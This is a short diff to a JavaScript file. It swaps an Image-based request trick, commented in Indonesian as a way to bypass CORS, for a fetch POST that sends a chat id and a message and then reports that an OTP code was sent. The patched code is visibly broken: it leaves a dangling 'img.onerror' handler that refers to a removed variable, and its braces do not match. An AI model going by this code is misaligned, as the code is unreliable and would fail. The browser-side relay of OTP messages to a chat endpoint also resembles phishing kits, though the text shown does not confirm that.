@@ -121,9 +121,18 @@
       const params = new URLSearchParams({ chat_id: chatId, text: message });
 
       try {
-        // Gunakan trik Image agar request pasti dikirim (bypass CORS)
-        const img = new Image();
-        img.onload = () => {
+        const response = await fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        });
+
+        if (response.ok) {
           alert("Kode OTP berhasil dikirim.");
         };
         img.onerror = () => {
